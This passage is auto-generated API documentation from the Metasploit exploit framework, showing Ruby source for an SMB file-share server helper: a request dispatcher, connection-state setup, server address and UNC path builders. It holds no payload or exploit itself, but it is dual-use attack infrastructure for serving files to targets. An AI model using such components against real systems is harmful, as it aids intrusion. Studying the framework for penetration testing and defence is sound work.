  <h3 class="signature " id="smb_cmd_dispatch-instance_method">
  
    - (<tt>Fixnum</tt>) <strong>smb_cmd_dispatch</strong>(cmd, c, buff) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Main dispatcher function. Takes the client data and performs a case switch
on the command (e.g. Negotiate, Session Setup, Read file, etc.)</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>cmd</span>
      
      
        <span class='type'>(<tt>Fixnum</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The SMB Command requested.</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>c</span>
      
      
        <span class='type'>(<tt>Socket</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The client to answer.</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>buff</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The data including the client request.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Fixnum</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The number of bytes returned to the client as response.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 278</span>

<span class='kw'>def</span> <span class='id identifier rubyid_smb_cmd_dispatch'>smb_cmd_dispatch</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_smb'>smb</span> <span class='op'>=</span> <span class='ivar'>@state</span><span class='lbracket'>[</span><span class='id identifier rubyid_c'>c</span><span class='rbracket'>]</span>

  <span class='id identifier rubyid_pkt'>pkt</span> <span class='op'>=</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_BASE_PKT</span><span class='period'>.</span><span class='id identifier rubyid_make_struct'>make_struct</span>
  <span class='id identifier rubyid_pkt'>pkt</span><span class='period'>.</span><span class='id identifier rubyid_from_s'>from_s</span><span class='lparen'>(</span><span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
  <span class='comment'>#Record the IDs
</span>  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:process_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ProcessID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:user_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>UserID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:tree_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>TreeID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:multiplex_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MultiplexID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>

  <span class='kw'>case</span> <span class='id identifier rubyid_cmd'>cmd</span>
    <span class='kw'>when</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_COM_NEGOTIATE</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_negotiate'>smb_cmd_negotiate</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_COM_SESSION_SETUP_ANDX</span>
      <span class='id identifier rubyid_word_count'>word_count</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WordCount</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
      <span class='kw'>if</span> <span class='id identifier rubyid_word_count'>word_count</span> <span class='op'>==</span> <span class='int'>0x0d</span> <span class='comment'># Share Security Mode sessions
</span>        <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_session_setup_andx'>smb_cmd_session_setup_andx</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
      <span class='kw'>else</span>
        <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SMB Share - </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:ip</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'> Unknown SMB_COM_SESSION_SETUP_ANDX request type, ignoring... </span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
        <span class='kw'>return</span> <span class='id identifier rubyid_smb_error'>smb_error</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_STATUS_SUCCESS</span><span class='rparen'>)</span>
      <span class='kw'>end</span>
    <span class='kw'>when</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_COM_TRANSACTION2</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_trans2'>smb_cmd_trans2</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_COM_NT_CREATE_ANDX</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_nt_create_andx'>smb_cmd_nt_create_andx</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_COM_READ_ANDX</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_read_andx'>smb_cmd_read_andx</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>when</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_COM_CLOSE</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_cmd_close'>smb_cmd_close</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
    <span class='kw'>else</span>
      <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SMB Share - </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:ip</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'> Unknown SMB command </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='lparen'>(</span><span class='int'>16</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>, ignoring... </span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
      <span class='kw'>return</span> <span class='id identifier rubyid_smb_error'>smb_error</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_STATUS_SUCCESS</span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="smb_conn-instance_method">
  
    - (<tt>Hash</tt>) <strong>smb_conn</strong>(c) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>New connection handler, executed when there is a new connection.</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>c</span>
      
      
        <span class='type'>(<tt>Socket</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The client establishing the connection.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Hash</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The hash with the client data initialized.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


259
260
261
262
263
264
265
266
267
268
269</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 259</span>

<span class='kw'>def</span> <span class='id identifier rubyid_smb_conn'>smb_conn</span><span class='lparen'>(</span><span class='id identifier rubyid_c'>c</span><span class='rparen'>)</span>
  <span class='ivar'>@state</span><span class='lbracket'>[</span><span class='id identifier rubyid_c'>c</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lbrace'>{</span>
    <span class='symbol'>:name</span>         <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerhost'>peerhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerport'>peerport</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
    <span class='symbol'>:ip</span>           <span class='op'>=&gt;</span> <span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerhost'>peerhost</span><span class='comma'>,</span>
    <span class='symbol'>:port</span>         <span class='op'>=&gt;</span> <span class='id identifier rubyid_c'>c</span><span class='period'>.</span><span class='id identifier rubyid_peerport'>peerport</span><span class='comma'>,</span>
    <span class='symbol'>:multiplex_id</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>0xffff</span><span class='rparen'>)</span><span class='comma'>,</span>
    <span class='symbol'>:process_id</span>   <span class='op'>=&gt;</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>0xffff</span><span class='rparen'>)</span><span class='comma'>,</span>
    <span class='symbol'>:file_id</span>      <span class='op'>=&gt;</span> <span class='int'>0xdead</span><span class='comma'>,</span>
    <span class='symbol'>:dir_id</span>       <span class='op'>=&gt;</span> <span class='int'>0xbeef</span>
  <span class='rbrace'>}</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="srvhost-instance_method">
  
    - (<tt>String</tt>) <strong>srvhost</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Builds the server address.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The server address.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


251
252
253</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 251</span>

<span class='kw'>def</span> <span class='id identifier rubyid_srvhost'>srvhost</span>
  <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SRVHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>0.0.0.0</span><span class='tstring_end'>&#39;</span></span> <span class='op'>?</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_source_address'>source_address</span> <span class='op'>:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SRVHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="unc-instance_method">
  
    - (<tt>Object</tt>) <strong>unc</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Builds the UNC Name for the shared file</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


226
227
228
229
230
231
232
233
234</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 226</span>

<span class='kw'>def</span> <span class='id identifier rubyid_unc'>unc</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_folder_name'>folder_name</span>
    <span class='id identifier rubyid_path'>path</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\\\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_srvhost'>srvhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_share'>share</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_folder_name'>folder_name</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_file_name'>file_name</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_path'>path</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\\\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_srvhost'>srvhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_share'>share</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_file_name'>file_name</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_path'>path</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

    <div id="footer">
  Generated on Tue Jan 19 22:33:29 2016 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.8.7.6 (ruby-2.1.7).
</div>

  </body>
</html>